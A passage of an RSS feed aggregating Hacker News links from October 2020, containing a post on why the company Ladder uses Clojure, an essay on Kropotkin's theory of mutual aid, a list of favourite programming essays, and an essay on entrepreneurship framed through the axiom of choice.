<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://alastairreid.github.io/rust-testability/">https://alastairreid.github.io/rust-testability/</a></em></p>]]>
            </description>
            <link>https://alastairreid.github.io/rust-testability/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24952378</guid>
            <pubDate>Sat, 31 Oct 2020 15:47:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Clojure?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24952085">thread link</a>) | @austinbirch
<br/>
October 31, 2020 | https://jeffchen.dev/posts/Why-Clojure/ | <a href="https://web.archive.org/web/*/https://jeffchen.dev/posts/Why-Clojure/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>One piece of unattributed wisdom that's stuck with me is "don't take more than one technology bet". At Ladder, our big bet is using <a href="https://clojure.org/" target="_blank" rel="nofollow noopener noreferrer">Clojure</a> for fullstack app development. Ladder's used Clojure since day 1 in 2015, and we wouldn't want it any different! In particular, Clojure's Lisp heritage, focus on pure functions and immutable data structures, unified client-server support, and superior developer experience have helped us write higher quality code faster.</p>
<!-- excerpt -->
<h2>Pure functions and immutability</h2>
<p>One of the challenges with ordinary, imperative programming languages like Javascript or Python is the increasing complexity of state management. As your application grows, it becomes harder and harder to isolate where in the codebase specific changes to your application state occur. This is because with typical application architectures in those languages, any function can perform <a href="https://en.wikipedia.org/wiki/Side_effect_%28computer_science%29" target="_blank" rel="nofollow noopener noreferrer">side effects</a> or modify incoming or global state. On the other hand, Clojure strongly emphasizes working with <a href="https://en.wikipedia.org/wiki/Pure_function" target="_blank" rel="nofollow noopener noreferrer">pure functions</a> (well, if you discount I/O...) and <a href="https://clojure.org/about/state" target="_blank" rel="nofollow noopener noreferrer">immutable data structures</a>. A Clojure programmer must be explicit when defining and modifying mutable state - this helps minimize its usage and makes it easier to reason about.</p>
<p>Immutable data structures and pure functions also lend themselves well to concurrent programming. We rarely find ourselves worrying about locks and shared data in a multi-threaded environment, because our functions are rarely modifying shared state. And when we do, Clojure provides <code>atom</code>, a thread-safe wrapper around ordinary data structures. Behind the scenes, setting an <code>atom</code>'s value calls <code>compare-and-set!</code>. That means no fussing around with locks or mutexes and no worrying about your data changing before you modify it. With this one simple construct, Clojure removes 99% of our concurrency headaches.</p>
<h2>Clojure is a Lisp</h2>
<p>There are probably enough Lisp arguments on the Internet already - I'll defer to <a href="https://clojure.org/about/rationale#_lisp_is_a_good_thing" target="_blank" rel="nofollow noopener noreferrer">Rich Hickey</a> (Clojure's creator) and <a href="http://www.paulgraham.com/avg.html" target="_blank" rel="nofollow noopener noreferrer">Paul Graham</a> instead of adding another rehash. That said, Clojure provides some advantages over other Lisps like Common Lisp and Scheme:</p>
<ul>
<li>CL only includes lists in its core language spec. Clojure introduces vectors, sets, and maps which makes reading and writing code so much less tedious. Of course Scheme has all of these except sets.</li>
<li>Clojure's core data structures are immutable which, as discussed above, makes reasoning about code, especially concurrent code, much easier.</li>
</ul>
<h2>Clojure runs everywhere</h2>
<p>Clojure provides first class support for sharing code between platforms with <a href="https://clojure.org/guides/reader_conditionals" target="_blank" rel="nofollow noopener noreferrer">reader conditionals</a>. Most of our namespaces at Ladder take advantage of this and are shared across our client (Clojurescript) and server (Clojure). In fact, all of our client React code (aside from browser-specific API calls like clipboard, input handlers, etc) supports being run on the JVM. This lets us run what we call "full-stack tests" entirely within a Java process. For example, we can run full user flows like "user can accept a life insurance policy" and assert against both client and server state <strong>in the same test</strong>. The closest analogue without this superpower would be running a Selenium test against a running webserver, which introduces all sorts of potential flakiness. For more on full-stack tests, check out <a href="https://www.youtube.com/watch?v=qijWBPYkRAQ&amp;t=346s" target="_blank" rel="nofollow noopener noreferrer">this talk</a> two of our engineers gave at Clojure West in 2017.</p>
<p>Clojure also provides easy <a href="https://clojure.org/guides/reader_conditionals#_host_interop" target="_blank" rel="nofollow noopener noreferrer">host interop</a> for each supported platform. This lets us leverage the full JVM (and Javascript) ecosystem. For example, we use popular Java libraries like <a href="https://www.eclipse.org/jetty/" target="_blank" rel="nofollow noopener noreferrer">Jetty</a>, <a href="https://mvnrepository.com/artifact/org.apache.kafka/kafka-clients" target="_blank" rel="nofollow noopener noreferrer">kafka-clients</a>, <a href="https://github.com/google/tink" target="_blank" rel="nofollow noopener noreferrer">Tink</a>, and more. On the frontend, we use React, and can easily include other Javascript libraries for analytics, error handling, and session replays.</p>
<h2>Developer experience</h2>
<p>When I’ve worked with Typescript and Python in the past, I was constantly waiting for my development server to reload. Clojure makes updating code on your local server as simple as reloading the updated namespace in your REPL. If you want, you can even <a href="https://github.com/nrepl/nrepl" target="_blank" rel="nofollow noopener noreferrer">update remote, (hopefully) non-production webservers</a>! Being able to evaluate code in a REPL and have your running web server update in less than a second makes exploration and iteration on your actual backend so much faster. Instant feedback makes developers more playful and experimental. Ultimately, it helps them write better code faster.</p>
<p>It’s also super easy to run small chunks of code in the REPL. Ladder, like other Clojure shops, has a convention of documenting namespace usage with a <code>comment</code> block at the bottom. Developers can use the code within to learn the namespace’s API, run commonly used procedures, or test changes to the rest of the namespace - all without leaving their editor!</p>
<h2>Why not Clojure?</h2>
<p>While we're extremely satisfied with our choice of Clojure, we've had our fair share of headaches. First, Clojure processes take a long time to start up - especially as the size of the application grows. Our webserver at Ladder takes a full minute before it can accept web requests. This makes autoscaling in response to load more challenging - some of our load can spike in well under a minute, so we have to be consistently overprovisioned to handle it. Second, Clojure produces pretty big artifacts. This matters less on the backend, where our webserver JAR is over 1.5GB, but hurts us on the frontend. We still have work to do here, but our initial bundle is 7.2MB uncompressed (1.0MB gzipped)! If raw performance or bundle size is your primary concern, you might be better off choosing another language.</p>
<h2>Conclusion</h2>
<p>As a small company, we have more ideas to try than we have bandwidth to implement. Using Clojure has helped our team be more iterative and more productive, so we can ship more experiments and projects than we would otherwise be able to. I feel super lucky that Ladder introduced me to Clojure - and I'm excited to see how Clojure and our use of it continues to evolve!</p>
</div></div>]]>
            </description>
            <link>https://jeffchen.dev/posts/Why-Clojure/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24952085</guid>
            <pubDate>Sat, 31 Oct 2020 15:14:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The radical aristocrat who put kindness on a scientific footing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24952001">thread link</a>) | @rbanffy
<br/>
October 31, 2020 | https://psyche.co/ideas/kropotkin-the-radical-aristocrat-who-put-kindness-on-a-scientific-footing | <a href="https://web.archive.org/web/*/https://psyche.co/ideas/kropotkin-the-radical-aristocrat-who-put-kindness-on-a-scientific-footing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Kropotkin and Poliakov â€“ enthusiastic, curious and well-read young men in their 20s â€“ were fired by the prospect of finding evidence of that defining factor of evolution set out by Charles Darwin in <em>On the Origin of Species</em> (1859): competition<em>.</em> They were disappointed. As Kropotkin later wrote:</p>
<blockquote>We saw plenty of adaptations for struggling, very often in common, against the adverse circumstances of climate, or against various enemies, and Polyakoff wrote many a good page upon the mutual dependency of carnivores, ruminants, and rodents in their geographical distribution; we witnessed numbers of facts of mutual support â€¦ [but] facts of real competition and struggle between higher animals of the same species came very seldom under my notice, though I eagerly searched for them.</blockquote>
<p>Kropotkin pursued this contradiction for decades. Observation and wide reading convinced him that what heâ€™d seen in Siberia was no exception, but a rule. In the 1860s, he watched a vast exodus of fallow deer gather in their thousands to cross the river Amur at its narrowest point to escape an early snowfall. In 1882, he was fascinated by a crab stuck on its back in a tank in Brighton Aquarium; it was painstakingly rescued by a band of comrades. Kropotkin collected descriptions from all over the world of the sociable behaviours of ants, bees, termites, falcons, swallows, horned larks, migrating birds, gazelles, buffalo, colonies of beavers, squirrels, mice, flocks of seals, herds of wild horses, tribes of dogs, wolf packs, marmots, rats, chinchillas, as well as apes and monkeys. He wrote that:</p>
<blockquote>[A]s we ascend the scale of evolution, we see association growing more and more conscious. It loses its purely physical character, it ceases to be simply instinctive, it becomes reasoned.</blockquote>
<p>It proved impossible for Kropotkin, a man â€˜amiable to the point of saintlinessâ€™ according to George Bernard Shaw, to dedicate himself entirely to the â€˜highest joysâ€™ of scientific discovery, when all around him he saw â€˜nothing but misery and struggle for a mouldy bit of breadâ€™, as he put it in his <em>Memoirs of a Revolutionist</em> (1899). In 1872, in Switzerland, he became an anarchist, impressed by the egalitarian fraternity he found among the watchmakers of Jura. Back in Russia, he joined the revolutionary Circle of Tchaikovsky, disseminating underground literature and lecturing to the workers of St Petersburg disguised as Borodin the peasant agitator. His propaganda landed him in prison, but he escaped in 1876 with the help of comrades. By 1883, he was a political prisoner once again, this time in France. This second confinement gave him time to develop his arguments about evolution: he started to address systematically the conflicting interpretations of Darwin emerging in different parts of the world.</p>
<p>Human beings could overcome competitive struggle by restructuring society along principles of community and self-sufficiency</p>
<p>In England, the biologist, anthropologist and anatomist Thomas Huxley had quickly emerged as â€˜Darwinâ€™s bulldogâ€™. Self-described as sharp of â€˜claws and beakâ€™, Huxley was prepared to â€˜go to the Stake if requisiteâ€™ to defend evolutionary doctrine. His views on human nature and political economy were defined by Thomas Hobbes and Thomas Robert Malthus: life was an endless fight for scarce resources. The libertarian Herbert Spencer likewise applied natural selection to economics, using his infamous coinage the â€˜survival of the fittestâ€™ to justify laissez-faire capitalism. Popularly labelled â€˜social Darwinismâ€™, this view became gospel for Gilded Age industrialists such as John D Rockefeller. Although Huxley himself didnâ€™t recommend the â€˜survival of the fittestâ€™ rule as a basis for morality â€“ quite the reverse â€“ he certainly believed that human beings were brutal and competitive, their sociability merely a recent veneer, rationalised by self-interest.</p>
<p>After Huxley published his pessimistic essay â€˜The Struggle for Existence and Its Bearing Upon Manâ€™ (1888) in <em>The Nineteenth Century</em>, an influential Victorian monthly review, Kropotkin was in a good position to launch an attack on Huxleyâ€™s idea of nature as a â€˜gladiatorâ€™s showâ€™. By this time, having been released from prison following an international outcry, Kropotkin was established in England, becoming quite a celebrity in the socialist and anarchist circles that blossomed through the mid-1880s. He promoted his political ideas in the international Left-wing press, and cofounded a London-based journal called <em>Freedom</em>, but made a living writing for scientific periodicals.</p>
<p>Between 1890 and 1915, in a series of interdisciplinary essays, Kropotkin drew on biology, sociology, history, (anti-racist) ethnology and anthropology to argue that species can organise and cooperate to overcome the natural environment and ensure their future survival. In 1902, the first eight essays were brought together in a book entitled <em>Mutual Aid: A Factor of Evolution</em>, an account of mutual support in action across the animal world (from microorganisms to mammals), ancient and modern â€˜barbarianâ€™ and â€˜savageâ€™ societies, medieval city-states and, finally, among modern humanity.</p>
<p>Kropotkin sought to recover an uncorrupted Darwin, whose metaphors should not be read too literally. But his call to understand compassion as â€˜a powerful factor of further evolutionâ€™ cleared the way for a very particular political vision: human beings could overcome competitive struggle by voluntarily restructuring and decentralising society along principles of community and self-sufficiency.</p>
<p><strong>Kropotkin became</strong> <strong>enamoured</strong> with mutual aid after reading an 1880 lecture on the subject by the celebrated zoologist Karl Kessler. Like other Russian naturalists at the time, Kessler didnâ€™t deny the struggle for existence, but his own fieldwork in harsh and sparsely populated regions of the Russian empire strongly suggested that â€˜the progressive development of the animal kingdom, and especially of mankind, is favoured much more by mutual support than by mutual struggleâ€™. But, as Kropotkin mourned: â€˜like so many good things published in the Russian tongue only, that remarkable address remains almost entirely unknownâ€™.</p>
<p>Kropotkin laid the groundwork for subsequent studies of altruism and mutualism in natural selection</p>
<p>Neither was Kropotkin alone politically. The historian of science Eric Johnson has recently <a href="https://open.library.ubc.ca/cIRcle/collections/ubctheses/24/items/1.0378937" rel="nofollow noreferrer noopener">demonstrated</a> that the rhetoric of social Darwinism arose in reaction to â€˜Social<em>ist</em> Darwinismâ€™, while Piers Hale <a href="https://chicago.universitypressscholarship.com/view/10.7208/chicago/9780226108520.001.0001/upso-9780226108490" rel="nofollow noreferrer noopener">traces</a> a much more contested politics of evolution than many historians have previously recognised. The womenâ€™s rights campaigner Annie Besant in 1886 declared that she was a socialist because she believed in evolution. She was one of a number of thinkers on the Left who read Darwin as proof that power and privilege, not nature, were responsible for social inequality.</p>
<p>Kropotkinâ€™s ideas about mutual aid have often been dismissed. The title of Stephen Jay Gouldâ€™s confessional essay is telling: â€˜Kropotkin Was No Crackpotâ€™ (1988):</p>
<blockquote>If Kropotkin drew inappropriate hope for social reform from his concept of nature, other Darwinians had erred just as firmly â€¦ in justifying imperial conquest, racism, and oppression of industrial workers as the harsh outcome of natural selection in the competitive mode.</blockquote>
<p>Many biologists now <a href="https://www.scientificamerican.com/article/the-prince-of-evolution-peter-kropotkin/" rel="nofollow noreferrer noopener">credit</a> Kropotkin with laying the groundwork for all subsequent studies of altruism and mutualism in natural selection, and outlining an epigenetic framework in which heredity and development are integral to the process of evolutionary change. Social activists and anarchists embrace his ringing refutation of the political value of competition.</p>
<p>Kropotkin united science with anarcho-communism for the rest of his life, and <em>Freedom</em> continued to promote mutual aid in its columns. The turn of the century brought tough times for anarchism. London was no longer its international hub, an â€˜anarchist holy-cityâ€™. The principle of â€˜propaganda of the deedâ€™ had irrevocably conflated the movement in the public mind with dynamite, assassination and acts of terror, while surging enthusiasm for Marxism struck at anarchismâ€™s support base. Boer war jingoism hardly helped. â€˜[O]ur movement just now is so slow, so low down,â€™ Kropotkin complained to <em>Freedom</em>â€™s editor in 1904.</p>
<p>In the early hours of 28 December 1908, southern Italy was struck by the most calamitous earthquake ever to hit Europe. The shock, lasting 30-40 seconds, was followed by a devastating tsunami, flattening the cities of Messina and Reggio and killing more than 100,000 people in Calabria and Sicily. <em>Freedom</em> reported the aftermath, applauding the rescue operation as the perfect realisation of â€˜the mutual aid positionâ€™, and the â€˜deeds of superhuman heroismâ€™ achieved on the ground by common mortals â€˜who are supposed to need rulers to teach them what is rightâ€™. â€˜But,â€™ asked the paper, â€˜must we have a social cataclysm before the blind selfishness of this society can give place to human solidarity and the communal life which means plenty for all?â€™</p>
<p>Kropotkin finally returned to Russia after the Bolshevik Revolution, horrified by the authoritarian socialism that now held sway. Critical of all government to his death, he wavered in his last years between fear and hope for the future. A century later, mutual aid is a thriving model of political and social organisation, and Kropotkinâ€™s ideas have nourished thousands of bottom-up voluntary initiatives, not least Common Ground Relief and the Occupy movement. His heirs rejoice in a new slogan: â€˜solidarity, not charityâ€™.</p></div></div>]]>
            </description>
            <link>https://psyche.co/ideas/kropotkin-the-radical-aristocrat-who-put-kindness-on-a-scientific-footing</link>
            <guid isPermaLink="false">hacker-news-small-sites-24952001</guid>
            <pubDate>Sat, 31 Oct 2020 15:04:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Essays on Programming I Think About a Lot]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24951923">thread link</a>) | @jwworth
<br/>
October 31, 2020 | https://www.jakeworth.com/essays-on-programming-i-think-about-a-lot/ | <a href="https://web.archive.org/web/*/https://www.jakeworth.com/essays-on-programming-i-think-about-a-lot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Programming is a game of abstractions, and we programmers traffic in ideas.
When I find an idea that resonates with me, I turn into an evangelist for it to
everyone who works with me.</p>
<p>Here are some of my favorites. There’s a recency bias; I can’t remember some of
the formative essays from my early years as a programmer. </p>
<p>Thanks to <a href="https://www.benkuhn.net/progessays/">Ben Kuhn</a> for this idea!</p>
<h3>Essays</h3>
<p>Jeff Atwood, <a href="https://blog.codinghorror.com/the-first-rule-of-programming-its-always-your-fault/">The First Rule of Programming: It’s Always Your Fault</a>. I
like to answer questions on Stack Overflow, and an amazing amount of questions
on that website have a title like “Found a bug in React?” paired with an
introductory sentence: “I’m brand new to React.” It’s human to assume there’s a
problem with your tools or materials. To me, this essay’s point is that it’s
more profitable to assume the opposite, because your code hasn’t stood up to
anything close to the scrutiny of the code from a popular software project.</p>
<blockquote>
<p>If you truly aspire to being a humble programmer, you should have no qualms
about saying “hey, this is my fault— and I’ll get to the bottom of it.”
— Jeff Atwood</p>
</blockquote>
<hr>
<p>Shawn Wang, <a href="https://www.swyx.io/writing/learn-in-public/">Learn in Public</a>. Be public, leverage the encouragement and
criticism of others, and build a footprint for yourself on the internet. There
are a bunch of detours you can take as a junior developer that waste time and
potentially graduate you to <a href="https://daedtech.com/how-developers-stop-learning-rise-of-the-expert-beginner/">expert beginner</a> status; one of
them is hiding your work in an attempt to avoid criticism. I think one of the
smartest parts of argument this can be summed up in the adage: “The fastest way
to get the right answer to a question is to post the wrong answer on the
internet.”</p>
<blockquote>
<p>People think you suck? Good. You agree. Ask them to explain, in detail, why
you suck. You want to just feel good or you want to be good? No objections, no
hurt feelings. Then go away and prove them wrong.
— Shawn Wang</p>
</blockquote>
<hr>
<p>Elisabeth Hendrickson, <a href="https://testobsessed.com/2020/02/momentum-urgency/">Momentum &gt;
Urgency</a>. I found this post
recently, and it describes the best teams I’ve worked with. Effective teams
focus on process, not outcome. Managers of such teams know that a team member
being blocked isn’t a frustrating detail that that team member will have to
remedy, but rather a process failure that was luckily exposed while many more
remain hidden. They’ll use their managerial clout to fight with you against
that obstacle, considering it a top priority.</p>
<blockquote>
<p>What I’ve learned is that if we want things to go fast, a sense of momentum
is much more effective than a sense of urgency.
— Elisabeth Hendrickson</p>
</blockquote>
<hr>
<p>Scott Hanselman, <a href="https://www.hanselman.com/blog/do-they-deserve-the-gift-of-your-keystrokes">Do they deserve the gift of your
keystrokes?</a>.
This post isn’t just for programmers, but the statistical nature of it
resonated with me. Since reading it, I often consider the reach of my chosen
communication method, and whether I’m making efficient use of time.</p>
<blockquote>
<p>Assuming you want your message to reach as many people as possible, blog it. You only have so many hours in the day.
— Scott Hanselman</p>
</blockquote>
<hr>
<p>Joel Spolsky, <a href="https://www.joelonsoftware.com/2002/02/13/the-iceberg-secret-revealed/">The Iceberg Secret,
Revealed</a>.
Programmers know that what we can see on a web page can represent a small
fraction or none of the true functionality, completeness, and complexity of the
application. People who don’t write software don’t automatically know that.
Factor this into all communication.</p>
<blockquote>
<p> Customers Don’t Know What They Want. Stop Expecting Customers to Know What
They Want. It’s just never going to happen. Get over it.
— Joel Spolsky</p>
</blockquote>
<blockquote>
<p>Understand that any demos you do in a darkened room with a projector are
going to be all about pixels. If you can, build your UI in such a way that
unfinished parts look unfinished.
— Joel Spolsky</p>
</blockquote>
<hr>
<p><a href="http://xyproblem.info/">XY Problem</a>. When you’re asking for programming help
from someone, start by easing them into your situation, stating the problem,
your assumptions, and what you’ve tried and learned. Give them the chance to
poke holes in your logic.</p>
<blockquote>
<p>Remember that if your diagnostic theories were accurate, you wouldn’t be asking for help right?</p>
</blockquote>
<hr>
<p>Jon Evans, <a href="https://techcrunch.com/2011/05/07/why-the-new-guy-cant-code/">Why The New Guy Can’t
Code</a>. The truth
of this argument has confirmed itself to me over and over again. I think that I
became a programmer on the job. But you can become a programmer right now by
doing just one hard thing: committing to a meaningful project, no matter how
small, and finishing it, in spite of the obstacles you will face.</p>
<blockquote>
<p>So what should a real interview consist of? Let me offer a humble proposal:
don’t interview anyone who hasn’t accomplished anything. Ever. Certificates and
degrees are not accomplishments; I mean real-world projects with real-world
users.
— Jon Evans</p>
</blockquote>
<hr>
<p>Paul Slaughter, <a href="https://conventionalcomments.org/">Conventional comments</a>. I
believe in code reviews as a technique to raise quality, share information, and
help people grow. But they can go wrong in so many ways and have an almost
opposite effect. This technique– labeling comments to help the recipient
contextualize your feedback– has had a positive impact on several teams I’ve
been a part of.</p>
<blockquote>
<p>Labeling comments saves hours of undercommunication and misunderstandings.
They are also parseable by machines!
— Paul Slaughter</p>
</blockquote>
<hr>
<p>Zed Shaw via Abhishek Nagekar, <a href="https://www.nagekar.com/2018/06/advice-from-an-old-programmer-zed-shaw.html">Advice From An Old Programmer</a>. There will
likely come a day when you find programming to be a little bit boring. It will
cease to be joyful as a pure exercise. What do you do then? It’s a question I’m
grappling with. I’m choosing to use that skill to build things I care about,
and help others become programmers through volunteering.</p>
<blockquote>
<p>Programming as a profession is only moderately interesting. It can be a good
job, but you could make about the same money and be happier running a fast food
joint. You’re much better off using code as your secret weapon in another
profession.
— Zed Shaw</p>
</blockquote>
<!-- TODO -->
<!-- Dan McKinley, [Choose Boring Technology](https://mcfunley.com/choose-boring-technology) -->
<!-- Kent C. Dodds, [AHA Programming](https://kentcdodds.com/blog/aha-programming). -->
<h3>Conclusion</h3>
<p>I plan to keep this list updated as I continue to read. Send me the essays you
keep returning to via <a href="https://twitter.com/jwworth">Twitter</a>!</p></div></div>]]>
            </description>
            <link>https://www.jakeworth.com/essays-on-programming-i-think-about-a-lot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951923</guid>
            <pubDate>Sat, 31 Oct 2020 14:52:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What makes entrepreneurship so difficult?]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24951824">thread link</a>) | @rjyoungling
<br/>
October 31, 2020 | http://younglingfeynman.com/essays/artofbusiness | <a href="https://web.archive.org/web/*/http://younglingfeynman.com/essays/artofbusiness">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-1cced88d6a399edc0c5b"><div><p><em>TLDR: Science relies in large part on replicability. Business does not. Copying is a zero-sum game and all participating players will compete profits away until they reach a Nash-equilibrium, where a further lowering of price, and thus margins, is unsustainable. Innovation is always new and therefore never formulaic. There are certain guidelines successful businesses seem to use but in the end, you’ll still have to go with your gut and make a judgment call according to your own ethical values.</em></p><p>Arguably, replicating findings is one of the best tools we have in our scientific arsenal in order to test the validity of a conclusion.</p><p>Which is why the psychology community was not amused when the methodological crisis now known as the <a href="https://en.wikipedia.org/wiki/Replication_crisis" target="_blank">Replication crisis</a> started, where it was discovered that many studies weren’t replicable (Nosek et al., 2015).</p><p>Even some of the most cited and well-known studies such as the study that power posing makes you act bolder (Carney, Cuddy &amp; Yap, 2010).</p><p>Which, incidentally, is why it’s so important to not just reference research (instead of parroting some YouTube influencer or blogger) but to also carefully analyze the literature and its limitations yourself. *1</p><p>This doesn’t guarantee perfection, but it does decrease obvious and preventable mistakes.</p><p>JP Ioannidis pointed out serious problems with published research in ‘’Why most published research findings are false.’’</p><blockquote><p>‘’ Simulations show that for most study designs and settings, it is more likely for a research claim to be false than true. Moreover, for many current scientific fields, claimed research findings may often be simply accurate measures of the prevailing bias.’’ (<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC1182327/" target="_blank">Ioannidis, 2005</a>).</p></blockquote><p>Methodological issues aside, replication matters.</p><p>Well, that’s all fine and dandy weren’t it for the pesky fact that our field relies on innovation.</p><p>Even if you extract all the knowledge from the brains of <a href="https://en.wikipedia.org/wiki/Kevin_Systrom" target="_blank">Kevin Systrom</a> and <a href="https://en.wikipedia.org/wiki/Mike_Krieger" target="_blank">Mike Krieger </a>and build Instagram, you’d get the complete opposite result because Instagram already exists.</p><p>Even Kevin and Mike can’t replicate it because the variables have changed.</p><p>The entire environment and current social climate (regarding privacy, advertising, users as the product, and social media addiction) are different, and even if it weren’t, no user is gonna switch to an IG clone when IG already exists.</p><p>There are some guidelines that most successful companies seem to follow, however, you can’t formulate a step-by-step plan for the reasons laid out above.</p><p><a href="https://en.wikipedia.org/wiki/Peter_Thiel" target="_blank">Peter Thiel</a> was one of the first to point out this distinction between companies that go from 0 to 1, innovation, and companies that go from 1 to n (copying), in his book <a href="https://www.amazon.com/Zero-One-Notes-Startups-Future/dp/0804139296" target="_blank">Zero to One</a>.</p><p>Companies that do copy and thus employ a formula they copied from another company open themselves up to fierce competition.</p><p>As more players participate in this zero-sum game, the fixed pie of users and profits will get competed away because there are too many mouths to feed with finite resources. *2</p><p>If you copy each other with no (or no meaningful) distinctions then price will be the only thing you can compete on, which is exactly what we see in commodity markets.</p><p>Player B will lower prices in order to steal market share from Player A. Player A lowers them still. Player C lowers it below both of them. Player D goes too low and goes bankrupt.</p><p>Over time, price will collapse into a <a href="https://en.wikipedia.org/wiki/Nash_equilibrium" target="_blank">Nash-equilibrium</a>.</p><p>A point where no player can do better by unilaterally changing their strategy. Go below the current price point and you go out of business because the unit economics fail. Go above the current price point and you go out of business because there’s no good reason for users to pay more for the exact same product. *3</p><p>Unless one player, usually a new one, sufficiently innovates and thus creates a whole new business model. In effect, changing the game. This is essentially the raison d’etre of a startup, and it’s why <a href="https://steveblank.com/about/">Steve Blank</a> defined a startup as: ‘‘a temporary organization <strong>used to search</strong> for a repeatable and scalable business model.’’</p><p>This problem is further exacerbated by the fact that we go through traditional education by&nbsp;default.</p><p>A system that’s not designed to teach independent thinking but rather to reward obedience and implementing rules.</p><p>If you think that’s my opinion instead of the facts, then watch this to get a better understanding of how our modern education system was formed:</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1560851539916_31181"><div><p>If you’ll allow me, I’d like to take a short trip with you to use mathematics as an analogy.</p><p>In mathematical set theory, there’s something called the axiom of choice&nbsp;(AoC).</p><p>Without making the <a href="https://en.wikipedia.org/wiki/Axiom_of_choice" target="_blank">AoC</a> too complex, picture this:</p><p>Suppose you have 3 jars: Jar 1, Jar 2, Jar 3.</p><p>Each jar contains a piece of paper with a few whole numbers written on it.</p><p>Jar 1: 4, 8, 45</p><p>Jar 2: 646, 23</p><p>Jar 3: 894, 7, 45649, 54, 76</p><p>Now I can make a new jar: Jar 4, which contains one element from each of the jars.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1560851539916_34730"><div><p>Okay… in order to do that we need to build some machine where we can put something in and it spits something out (a function).</p><p>Let’s create a function that just ‘’chooses’’ the smallest element in each jar.</p><p>So it picks: 4 from Jar 1, 23 from Jar 2 and 7 from Jar 3.</p><p>So now we can put a piece of paper in Jar 4 with 4, 23, 7 on it.</p><p>We’ve created a choice function ‘’pick the smallest element out of each jar’’ that creates a new set (Jar 4) with the chosen elements.</p><p>Even if we had infinite jars, this function always works.</p><p>Because with natural numbers (whole numbers 1 and up), there’s always ‘a smallest’.</p><p>But what if we have an interval in Jar 2 such as (3,5].</p><p>The symbol ( means 3 is not included.</p><p>This creates a problem because what’s the smallest element we should pick now?</p><p>3.1? Well, what about half that 3.05?</p><p>Well, what about half of that again 3.025?</p><p>No matter how close we get to 3 we can always choose a smaller element so our choice function doesn’t work here.</p><p>When you invoke the AoC you claim that even though we don’t know what the choice function is, you’re going to assume there is one.&nbsp;</p><p>(That there is a way to pick one element out of each jar and create a new jar with those elements.)</p><p>An analogy <a href="https://en.wikipedia.org/wiki/Bertrand_Russell" target="_blank">Bertrand Russell</a> came up with is that if you have an infinite pair of shoes you can create a choice function: Pick the left shoe from every pair.</p><p>But if you have an infinite pair of identical socks, there’s no such thing as right or left, so you can’t create a choice function to pick one sock from each pair and therefore have to invoke the AoC.</p><p>The AoC is something that can not be proven or disproven, you either invoke it or you don’t.</p><p>If you use it, it allows you to do certain kinds of mathematics but also creates paradoxes such as the Banach-Tarski paradox.&nbsp;</p><p><em>Hard to explain without mathematics but a sketchy way to think about it is that it’s possible to break a sphere into pieces, rotated them and you get your sphere back, rotate them differently and you have two spheres with the same volume as the original.</em></p><p>And if you don’t invoke the AoC, there’s certain mathematics you can’t do.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1560851539916_43081"><div><p>Just like not knowing the existence of a choice function and invoking the Axiom of Choice, we often can’t know the best way to proceed in business under the current market and technology circumstances.</p><p>We often can’t prove or disprove our hypotheses, especially when you’re innovating, so reason fails us to some extent.</p><p>We talked about the limitations of reason and the upside of using a more Darwinian approach in the essay series: ‘‘<a href="https://www.younglingfeynman.com/essays/illogical" target="_blank">Why Your Business Needs More Weird Ideas.</a>’’</p><p>In essence, you’re saying: ‘‘It’s fundamentally impossible to determine what the best way to innovate is, but I’m just gonna assume there is a way.’’</p><p>It’s an enigmatic problem so you just have to take a stance and make a decision according to your ethical values.</p><p>I want to end with an excerpt from the interview with Andrew Mason, the Founder and early CEO of&nbsp;Groupon.</p><p><a href="http://nymag.com/intelligencer/2018/10/andrew-mason-on-groupon.html" target="_blank">The Quick Rise and Even Faster Fall of Groupon, Through the Eyes of Its CEO.</a></p><blockquote><p><strong>There was one other part of the letter that says your biggest regrets are the moments that you let a lack of data override your intuition of what’s best for the customers. What did you mean by that?</strong></p><p><strong><br></strong>Groupon started out with these really tight principles about how the site was going to work, really being pro-customer. And as we expanded people in the company would say, “Hey, why don’t we try running two deals a day?” “Why don’t we start sending two emails a day?” And I’d think, <em>That sounds awful. Who wants to get two emails every single day from a company. </em>And they’d be like, <em>Sure, it sounds awful to you. But we’re a data-driven company, so why don’t we let the data decide? Why don’t we do a test?</em> And we’d do a test, and it would show that maybe people would unsubscribe at a slightly higher rate, but the increase in purchasing would more than make up for it. You’d get in a situation where it doesn’t feel right, but it does seem like a rational decision.</p><p>The problem was when you’re in hypergrowth like this, you don’t have time to see what is going to happen to the data in the long term. The churn would catch up with you. People would unsubscribe at higher rates, and then, before you know it, the service has just turned into something — if you look at Groupon now, it’s just this vestige of what it once was. There’s no real copywriting. It’s a marketplace of coupons. It’s still a service that a lot of people get a lot of value out of, but it doesn’t have the spirit it once did.</p><p>There are certain things you have to be religious about in the company. That’s what I’ve taken away from that: There are some things where you have to say, “I’m sorry. I’m not going to look at the data on that. This is just what we’re going to do. We know that it’s right, and there’s nothing that’s going to shake us from that.” (Blumberg, 2018).</p></blockquote><p><em>*1 The fact that almost everyone is lazy and assume others have done their homework vs. doing the hard work of checking it themselves is a cognitive error known as </em><a href="https://en.wikipedia.org/wiki/Diffusion_of_responsibility" 